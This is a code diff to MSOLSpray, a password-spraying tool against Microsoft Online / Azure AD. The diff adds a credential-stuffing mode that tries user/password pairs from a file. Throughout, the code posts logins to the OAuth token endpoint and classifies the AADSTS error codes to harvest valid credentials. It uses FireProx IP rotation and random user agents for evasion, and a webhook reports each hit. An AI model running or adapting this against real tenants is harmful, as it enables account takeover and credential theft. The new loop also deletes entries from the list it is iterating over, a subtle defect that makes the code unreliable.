@@ -103,6 +103,7 @@ def assertions(args):
     assert args.jitter in range(101)
     assert args.max_lockout >= 0
     assert args.timeout >= 0
+    assert args.creds or ((args.username or args.usernames) and (args.password or args.passwords))
     if args.proxy:
         assert "://" in args.proxy, "Malformed proxy. Missing schema?"
 
@@ -125,7 +126,14 @@ group_user.add_argument(
     metavar="FILE",
     help="File containing usernames in the format 'user@domain'.",
 )
-group_password = parser.add_mutually_exclusive_group(required=True)
+group_user.add_argument(
+    "-C",
+    "--creds",
+    type=str,
+    metavar="FILE",
+    help="File containing credentials in the format '<user><separator><password>'.",
+)
+group_password = parser.add_mutually_exclusive_group(required=False)
 group_password.add_argument("-p", "--password", type=str, help="Single password.")
 group_password.add_argument(
     "-P",
@@ -133,6 +141,11 @@ group_password.add_argument(
     type=str,
     help="File containing passwords, one per line.",
     metavar="FILE",
+)
+parser.add_argument(
+    "--sep",
+    default=",",
+    help="Separator used when parsing credentials file in CSV format."
 )
 parser.add_argument(
     "-o",
@@ -150,8 +163,10 @@ parser.add_argument(
 parser.add_argument(
     "--url",
     default="https://login.microsoft.com",
-    help=("A comma-separated list of URL(s) to spray against (default: %(default)s)."
-        " Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from."),
+    help=(
+        "A comma-separated list of URL(s) to spray against (default: %(default)s)."
+        " Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from."
+    ),
 )
 group_force = parser.add_mutually_exclusive_group(required=False)
 group_force.add_argument(
@@ -164,7 +179,7 @@ group_force.add_argument(
     "--force-first",
     action="store_true",
     dest="force_first",
-    help="Like --force but only for first iteration. Use it with '-a 2' for otimization.",
+    help="Like --force but only for first iteration. Use it with '-a 2' for optimization.",
 )
 parser.add_argument(
     "--shuffle",
@@ -199,7 +214,7 @@ parser.add_argument(
     "--notify-each",
     action="store_true",
     dest="notify_each",
-    help="If set in conjunction with --notify WEBHOOK, it will notify each valid creds besides final summary."
+    help="If set in conjunction with --notify WEBHOOK, it will notify each valid creds besides final summary.",
 )
 parser.add_argument(
     "-s",
@@ -252,7 +267,7 @@ parser.add_argument(
     "--timeout",
     default=4,
     type=float,
-    help="Timeout for requests (default: %(default)s)"
+    help="Timeout for requests (default: %(default)s)",
 )
 parser.add_argument(
     "-v",
@@ -269,10 +284,13 @@ args.jitter += 1
 if args.notify and args.notify_actions is None:
     args.notify_actions = args.notify
 
-usernames = [args.username] if args.username else get_list_from_file(args.usernames)
-passwords = [args.password] if args.password else get_list_from_file(args.passwords)
+if args.creds:
+    credentials = get_list_from_file(args.creds)
+else:
+    usernames = [args.username] if args.username else get_list_from_file(args.usernames)
+    passwords = [args.password] if args.password else get_list_from_file(args.passwords)
 
-args.url = args.url.split(',')
+args.url = args.url.split(",")
 proxies = None
 if args.proxy:
     proxies = {
@@ -283,38 +301,40 @@ interrupt = False
 url_idx = 0
 start_time = time.strftime("%Y%m%d%H%M%S")
 
-for pindex, password in enumerate(passwords):
-    if interrupt:
-        break
-    if pindex > 0 and args.pause > 0:
-        print(f"[-] Sleeping {args.pause/60} minutes until next iteration")
-        time.sleep(args.pause + args.pause * (randrange(args.jitter) / 100))
+# TODO: refactor code to remove duplication
+if args.creds:
     # reset variables
     results = ""
     results_list = []
-    username_counter = 0
-    username_count = len(usernames)
+    creds_counter = 0
+    creds_count = len(credentials)
     lockout_question = False
-    lockout_max = trunc((args.max_lockout / 100) * username_count)
+    lockout_max = trunc((args.max_lockout / 100) * creds_count)
     lockout_counter = 0
 
-    print(f"There are {username_count} users in total to spray,")
+    print(f"There are {creds_count} credentials in total to try,")
     print("Now spraying Microsoft Online.")
     print(f"Current date and time: {time.ctime()}")
-    print(f"[*] Spraying password: {password}")
+
     if args.shuffle:
-        shuffle(usernames)
-    for uindex, username in enumerate(usernames):
-        if username_counter > 0 and args.sleep > 0:
+        shuffle(credentials)
+
+    for cindex, cred in enumerate(credentials):
+        if interrupt:
+            break
+
+        if creds_counter > 0 and args.sleep > 0:
             time.sleep(args.sleep + args.sleep * (randrange(args.jitter) / 100))
 
-        username_counter += 1
-        print(f"{username_counter} of {username_count} users tested", end="\r")
+        creds_counter += 1
+        print(f"{creds_counter} of {creds_count} credentials tested", end="\r")
+
+        username, password = cred.split(args.sep, 1)
 
         body = {
             "resource": "https://graph.windows.net",
             # (see https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/how-to-retrieve-an-azure-ad-bulk-token-with-powershell/ba-p/2944894)
-            "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",    # MS Graph API client id
+            "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",  # MS Graph API client id
             "client_info": "1",
             "grant_type": "password",
             "username": username,
@@ -344,15 +364,20 @@ for pindex, password in enumerate(passwords):
 
         issued = False
         retry = 3
-        while (not issued and retry > 0):
+        while not issued and retry > 0:
             try:
-                r = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body, proxies=proxies, verify=False, timeout=args.timeout)
+                r = requests.post(
+                    f"{url}/common/oauth2/token",
+                    headers=headers,
+                    data=body,
+                    proxies=proxies,
+                    verify=False,
+                    timeout=args.timeout,
+                )
             except Exception as e:
                 retry -= 1
                 if retry == 0:
-                    print(
-                        f"{text_colors.red}Error: {e}{text_colors.reset}"
-                    )
+                    print(f"{text_colors.red}Error: {e}{text_colors.reset}")
             else:
                 issued = True
         if not issued:
@@ -360,18 +385,23 @@ for pindex, password in enumerate(passwords):
                 untested_file.write(f"{username}:{password}\n")
             continue
 
-
         if r.status_code == 200:
             print(
                 f"{text_colors.green}SUCCESS! {username} : {password}{text_colors.reset}"
             )
             results += f"{username} : {password}\n"
             results_list.append(f"{username}:{password}")
-            usernames.remove(username)
+
+            credentials.remove(cred)
+            # remove other credentials with same username but different password
+            for curr in credentials:
+                if curr.startswith(username + args.sep):
+                    credentials.remove(curr)
+
             if args.notify and args.notify_each:
-                    msg = "Found valid credentials! (-.^)\n\n"
-                    msg += f"{username}:{password}"
-                    notify(args.notify, msg)
+                msg = "Found valid credentials! (-.^)\n\n"
+                msg += f"{username}:{password}"
+                notify(args.notify, msg)
         else:
             resp = r.json()
             error = resp["error_description"]
@@ -393,7 +423,11 @@ for pindex, password in enumerate(passwords):
                     f"{text_colors.yellow}WARNING! The user {username} doesn't exist.{text_colors.reset}"
                 )
                 if args.auto_remove > 0:
-                    usernames.remove(username)
+                    credentials.remove(cred)
+                    # remove other credentials with same username but different password
+                    for curr in credentials:
+                        if curr.startswith(username + args.sep):
+                            credentials.remove(curr)
 
             elif "AADSTS50079" in error or "AADSTS50076" in error:
                 # Microsoft MFA response
@@ -401,8 +435,14 @@ for pindex, password in enumerate(passwords):
                     f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.{text_colors.reset}"
                 )
                 results += f"{username} : {password}\n"
-                results_list.append(f"{username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use")
-                usernames.remove(username)
+                results_list.append(
+                    f"{username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use"
+                )
+                credentials.remove(cred)
+                # remove other credentials with same username but different password
+                for curr in credentials:
+                    if curr.startswith(username + args.sep):
+                        credentials.remove(curr)
                 if args.notify and args.notify_each:
                     msg = "Found valid credentials! (-.^)\n\n"
                     msg += f"{username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use."
@@ -414,8 +454,14 @@ for pindex, password in enumerate(passwords):
                     f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.{text_colors.reset}"
                 )
                 results += f"{username} : {password}\n"
-                results_list.append(f"{username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
-                usernames.remove(username)
+                results_list.append(
+                    f"{username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
+                )
+                credentials.remove(cred)
+                # remove other credentials with same username but different password
+                for curr in credentials:
+                    if curr.startswith(username + args.sep):
+                        credentials.remove(curr)
                 if args.notify and args.notify_each:
                     msg = "Found valid credentials! (-.^)\n\n"
                     msg += f"{username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
@@ -428,7 +474,11 @@ for pindex, password in enumerate(passwords):
                 )
                 lockout_counter += 1
                 if args.auto_remove > 1:
-                    usernames.remove(username)
+                    credentials.remove(cred)
+                    # remove other credentials with same username but different password
+                    for curr in credentials:
+                        if curr.startswith(username + args.sep):
+                            credentials.remove(curr)
 
             elif "AADSTS50057" in error:
                 # Disabled account
@@ -436,7 +486,11 @@ for pindex, password in enumerate(passwords):
                     f"{text_colors.yellow}WARNING! The account {username} appears to be disabled.{text_colors.reset}"
                 )
                 if args.auto_remove > 0:
-                    usernames.remove(username)
+                    credentials.remove(cred)
+                    # remove other credentials with same username but different password
+                    for curr in credentials:
+                        if curr.startswith(username + args.sep):
+                            credentials.remove(curr)
 
             elif "AADSTS50055" in error:
                 # User password is expired
@@ -444,11 +498,19 @@ for pindex, password in enumerate(passwords):
                     f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: The user's password is expired.{text_colors.reset}"
                 )
                 results += f"{username} : {password}\n"
-                results_list.append(f"{username}:{password} - NOTE: The user's password is expired.")
-                usernames.remove(username)
+                results_list.append(
+                    f"{username}:{password} - NOTE: The user's password is expired."
+                )
+                credentials.remove(cred)
+                # remove other credentials with same username but different password
+                for curr in credentials:
+                    if curr.startswith(username + args.sep):
+                        credentials.remove(curr)
                 if args.notify and args.notify_each:
                     msg = "Found valid credentials! (-.^)\n\n"
-                    msg += f"{username}:{password} - NOTE: The user's password is expired."
+                    msg += (
+                        f"{username}:{password} - NOTE: The user's password is expired."
+                    )
                     notify(args.notify, msg)
 
             elif "AADSTS700016" in error:
@@ -458,7 +520,11 @@ for pindex, password in enumerate(passwords):
                 )
                 results += f"{username} : {password}\n"
                 results_list.append(f"{username}:{password}")
-                usernames.remove(username)
+                credentials.remove(cred)
+                # remove other credentials with same username but different password
+                for curr in credentials:
+                    if curr.startswith(username + args.sep):
+                        credentials.remove(curr)
                 if args.notify and args.notify_each:
                     msg = "Found valid credentials! (-.^)\n\n"
                     msg += f"{username}:{password}"
@@ -471,75 +537,352 @@ for pindex, password in enumerate(passwords):
                 )
                 continue
             elif "AADSTS53003" in error:
-                #Access has been blocked by Conditional Access policies. The
-                #access policy does not allow token issuance.
+                # Access has been blocked by Conditional Access policies. The
+                # access policy does not allow token issuance.
                 print(
                     f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: Access blocked by Conditional Access policies.{text_colors.reset}"
                 )
                 results += f"{username} : {password}\n"
-                results_list.append(f"{username}:{password} - NOTE: Access blocked by Conditional Access policies.")
-                usernames.remove(username)
+                results_list.append(
+                    f"{username}:{password} - NOTE: Access blocked by Conditional Access policies."
+                )
+                credentials.remove(cred)
+                # remove other credentials with same username but different password
+                for curr in credentials:
+                    if curr.startswith(username + args.sep):
+                        credentials.remove(curr)
                 if args.notify and args.notify_each:
                     msg = "Found valid credentials! (-.^)\n\n"
                     msg += f"{username}:{password} - NOTE: Access blocked by Conditional Access policies."
                     notify(args.notify, msg)
             else:
                 # Unknown errors
-                print(f"Got an error we haven't seen yet for user {username}")
+                print(f"Got an error we haven't seen yet for credential {cred}")
                 print(error)
                 # Log unknown errors for late analysis
                 with open("unknown_codes.log", "a") as f:
-                    f.write(f"Got an error we haven't seen yet for user {username}")
+                    f.write(f"Got an error we haven't seen yet for credential {cred}")
                     f.write(f"{error}\n")
 
-        # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
-        if (
-            not args.force
-            and not (args.force_first and pindex == 0)
-            and lockout_counter > 0
-            and lockout_counter >= lockout_max
-            and lockout_question == False
-        ):
-            print(
-                f"{text_colors.red}WARNING! Multiple Account Lockouts Detected!{text_colors.reset}"
-            )
-            print(
-                f"{lockout_counter} of the accounts you sprayed appear to be locked out. Do you want to continue this spray?"
-            )
-            if args.notify_actions:
-                notify(
-                    args.notify_actions,
-                    "[MSOLSpray] Multiple account lockouts detected! Waiting for user interaction...",
-                )
-            yes = {"yes", "y"}
-            no = {"no", "n", ""}
-            lockout_question = True
-            choice = "X"
-            while choice not in no and choice not in yes:
-                choice = input("[Y/N] (default is N): ").lower()
-
-            if choice in no:
-                print("Cancelling the password spray.")
+            # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
+            if (
+                not args.force
+                and not (args.force_first and cindex == 0)
+                and lockout_counter > 0
+                and lockout_counter >= lockout_max
+                and lockout_question is False
+            ):
                 print(
-                    "NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled."
+                    f"{text_colors.red}WARNING! Multiple Account Lockouts Detected!{text_colors.reset}"
                 )
-                interrupt = True
-                break
+                print(
+                    f"{lockout_counter} of the accounts you sprayed appear to be locked out. Do you want to continue this spray?"
+                )
+                if args.notify_actions:
+                    notify(
+                        args.notify_actions,
+                        "[MSOLSpray] Multiple account lockouts detected! Waiting for user interaction...",
+                    )
+                yes = {"yes", "y"}
+                no = {"no", "n", ""}
+                lockout_question = True
+                choice = "X"
+                while choice not in no and choice not in yes:
+                    choice = input("[Y/N] (default is N): ").lower()
 
-            # else: continue even though lockout is detected
-    # end of user iteration
-    # write current users to file
-    with open(start_time + "_currentusers.txt", "w") as user_file:
-        usernames.sort()
-        user_file.write("\n".join(usernames))
+                if choice in no:
+                    print("Cancelling the password spray.")
+                    print(
+                        "NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled."
+                    )
+                    interrupt = True
+                    break
 
-    if results != "":
-        with open(args.out, "a") as out_file:
-            out_file.write(results)
-        print(f"Results have been written to {args.out}.")
-        if args.notify:
-            msg = "Found valid credentials! (-.^)\n\n"
-            msg += "\n".join(results_list)
-            notify(args.notify, msg)
+                # else: continue even though lockout is detected
+
+        if results != "":
+            with open(args.out, "a") as out_file:
+                out_file.write(results)
+            print(f"Results have been written to {args.out}.")
+            if args.notify:
+                msg = "Found valid credentials! (-.^)\n\n"
+                msg += "\n".join(results_list)
+                notify(args.notify, msg)
+            results = ""
+            results_list.clear()
+
+else:
+    for pindex, password in enumerate(passwords):
+        if interrupt:
+            break
+        if pindex > 0 and args.pause > 0:
+            print(f"[-] Sleeping {args.pause/60} minutes until next iteration")
+            time.sleep(args.pause + args.pause * (randrange(args.jitter) / 100))
+        # reset variables
         results = ""
-        results_list.clear()
+        results_list = []
+        username_counter = 0
+        username_count = len(usernames)
+        lockout_question = False
+        lockout_max = trunc((args.max_lockout / 100) * username_count)
+        lockout_counter = 0
+
+        print(f"There are {username_count} users in total to spray,")
+        print("Now spraying Microsoft Online.")
+        print(f"Current date and time: {time.ctime()}")
+        print(f"[*] Spraying password: {password}")
+        if args.shuffle:
+            shuffle(usernames)
+        for uindex, username in enumerate(usernames):
+            if username_counter > 0 and args.sleep > 0:
+                time.sleep(args.sleep + args.sleep * (randrange(args.jitter) / 100))
+
+            username_counter += 1
+            print(f"{username_counter} of {username_count} users tested", end="\r")
+
+            body = {
+                "resource": "https://graph.windows.net",
+                # (see https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/how-to-retrieve-an-azure-ad-bulk-token-with-powershell/ba-p/2944894)
+                "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",  # MS Graph API client id
+                "client_info": "1",
+                "grant_type": "password",
+                "username": username,
+                "password": password,
+                "scope": "openid",
+            }
+
+            headers = {
+                "Accept": "application/json",
+                "Content-Type": "application/x-www-form-urlencoded",
+            }
+            # include custom headers
+            if args.headers:
+                for header in args.headers:
+                    h, v = header.split(":", 1)
+                    headers[h.strip()] = v.strip()
+            # set user-agent
+            if args.rua:
+                ua = UserAgent(fallback=args.user_agent)  # avoid exception with fallback
+                headers["User-Agent"] = ua.random
+            else:
+                headers["User-Agent"] = args.user_agent
+
+            # rotate over URLs
+            url = args.url[url_idx % len(args.url)]
+            url_idx += 1
+
+            issued = False
+            retry = 3
+            while not issued and retry > 0:
+                try:
+                    r = requests.post(
+                        f"{url}/common/oauth2/token",
+                        headers=headers,
+                        data=body,
+                        proxies=proxies,
+                        verify=False,
+                        timeout=args.timeout,
+                    )
+                except Exception as e:
+                    retry -= 1
+                    if retry == 0:
+                        print(f"{text_colors.red}Error: {e}{text_colors.reset}")
+                else:
+                    issued = True
+            if not issued:
+                with open(start_time + "_untested.txt", "a") as untested_file:
+                    untested_file.write(f"{username}:{password}\n")
+                continue
+
+            if r.status_code == 200:
+                print(
+                    f"{text_colors.green}SUCCESS! {username} : {password}{text_colors.reset}"
+                )
+                results += f"{username} : {password}\n"
+                results_list.append(f"{username}:{password}")
+                usernames.remove(username)
+                if args.notify and args.notify_each:
+                    msg = "Found valid credentials! (-.^)\n\n"
+                    msg += f"{username}:{password}"
+                    notify(args.notify, msg)
+            else:
+                resp = r.json()
+                error = resp["error_description"]
+
+                if "AADSTS50126" in error:
+                    if args.verbose:
+                        print(
+                            f"VERBOSE: Invalid username or password. Username: {username} could exist."
+                        )
+                    continue
+
+                elif "AADSTS50128" in error or "AADSTS50059" in error:
+                    print(
+                        f"{text_colors.yellow}WARNING! Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.{text_colors.reset}"
+                    )
+
+                elif "AADSTS50034" in error:
+                    print(
+                        f"{text_colors.yellow}WARNING! The user {username} doesn't exist.{text_colors.reset}"
+                    )
+                    if args.auto_remove > 0:
+                        usernames.remove(username)
+
+                elif "AADSTS50079" in error or "AADSTS50076" in error:
+                    # Microsoft MFA response
+                    print(
+                        f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.{text_colors.reset}"
+                    )
+                    results += f"{username} : {password}\n"
+                    results_list.append(
+                        f"{username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use"
+                    )
+                    usernames.remove(username)
+                    if args.notify and args.notify_each:
+                        msg = "Found valid credentials! (-.^)\n\n"
+                        msg += f"{username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use."
+                        notify(args.notify, msg)
+
+                elif "AADSTS50158" in error:
+                    # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
+                    print(
+                        f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.{text_colors.reset}"
+                    )
+                    results += f"{username} : {password}\n"
+                    results_list.append(
+                        f"{username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
+                    )
+                    usernames.remove(username)
+                    if args.notify and args.notify_each:
+                        msg = "Found valid credentials! (-.^)\n\n"
+                        msg += f"{username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
+                        notify(args.notify, msg)
+
+                elif "AADSTS50053" in error:
+                    # Locked out account or Smart Lockout in place
+                    print(
+                        f"{text_colors.yellow}WARNING! The account {username} appears to be locked.{text_colors.reset}"
+                    )
+                    lockout_counter += 1
+                    if args.auto_remove > 1:
+                        usernames.remove(username)
+
+                elif "AADSTS50057" in error:
+                    # Disabled account
+                    print(
+                        f"{text_colors.yellow}WARNING! The account {username} appears to be disabled.{text_colors.reset}"
+                    )
+                    if args.auto_remove > 0:
+                        usernames.remove(username)
+
+                elif "AADSTS50055" in error:
+                    # User password is expired
+                    print(
+                        f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: The user's password is expired.{text_colors.reset}"
+                    )
+                    results += f"{username} : {password}\n"
+                    results_list.append(
+                        f"{username}:{password} - NOTE: The user's password is expired."
+                    )
+                    usernames.remove(username)
+                    if args.notify and args.notify_each:
+                        msg = "Found valid credentials! (-.^)\n\n"
+                        msg += (
+                            f"{username}:{password} - NOTE: The user's password is expired."
+                        )
+                        notify(args.notify, msg)
+
+                elif "AADSTS700016" in error:
+                    # Application not found in directory (probably because random-generated uuid above)
+                    print(
+                        f"{text_colors.green}SUCCESS! {username} : {password}{text_colors.reset}"
+                    )
+                    results += f"{username} : {password}\n"
+                    results_list.append(f"{username}:{password}")
+                    usernames.remove(username)
+                    if args.notify and args.notify_each:
+                        msg = "Found valid credentials! (-.^)\n\n"
+                        msg += f"{username}:{password}"
+                        notify(args.notify, msg)
+                elif "AADSTS50056" in error:
+                    # Invalid or null password: password doesn't exist in the directory for this user.
+                    # The user should be asked to enter their password again.
+                    print(
+                        f"{text_colors.yellow}WARNING! It looks like tenant is using external authentication method (e.g. Okta).{text_colors.reset}"
+                    )
+                    continue
+                elif "AADSTS53003" in error:
+                    # Access has been blocked by Conditional Access policies. The
+                    # access policy does not allow token issuance.
+                    print(
+                        f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: Access blocked by Conditional Access policies.{text_colors.reset}"
+                    )
+                    results += f"{username} : {password}\n"
+                    results_list.append(
+                        f"{username}:{password} - NOTE: Access blocked by Conditional Access policies."
+                    )
+                    usernames.remove(username)
+                    if args.notify and args.notify_each:
+                        msg = "Found valid credentials! (-.^)\n\n"
+                        msg += f"{username}:{password} - NOTE: Access blocked by Conditional Access policies."
+                        notify(args.notify, msg)
+                else:
+                    # Unknown errors
+                    print(f"Got an error we haven't seen yet for user {username}")
+                    print(error)
+                    # Log unknown errors for late analysis
+                    with open("unknown_codes.log", "a") as f:
+                        f.write(f"Got an error we haven't seen yet for user {username}")
+                        f.write(f"{error}\n")
+
+            # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
+            if (
+                not args.force
+                and not (args.force_first and pindex == 0)
+                and lockout_counter > 0
+                and lockout_counter >= lockout_max
+                and lockout_question == False
+            ):
+                print(
+                    f"{text_colors.red}WARNING! Multiple Account Lockouts Detected!{text_colors.reset}"
+                )
+                print(
+                    f"{lockout_counter} of the accounts you sprayed appear to be locked out. Do you want to continue this spray?"
+                )
+                if args.notify_actions:
+                    notify(
+                        args.notify_actions,
+                        "[MSOLSpray] Multiple account lockouts detected! Waiting for user interaction...",
+                    )
+                yes = {"yes", "y"}
+                no = {"no", "n", ""}
+                lockout_question = True
+                choice = "X"
+                while choice not in no and choice not in yes:
+                    choice = input("[Y/N] (default is N): ").lower()
+
+                if choice in no:
+                    print("Cancelling the password spray.")
+                    print(
+                        "NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled."
+                    )
+                    interrupt = True
+                    break
+
+                # else: continue even though lockout is detected
+        # end of user iteration
+        # write current users to file
+        with open(start_time + "_currentusers.txt", "w") as user_file:
+            usernames.sort()
+            user_file.write("\n".join(usernames))
+
+        if results != "":
+            with open(args.out, "a") as out_file:
+                out_file.write(results)
+            print(f"Results have been written to {args.out}.")
+            if args.notify:
+                msg = "Found valid credentials! (-.^)\n\n"
+                msg += "\n".join(results_list)
+                notify(args.notify, msg)
+            results = ""
+            results_list.clear()
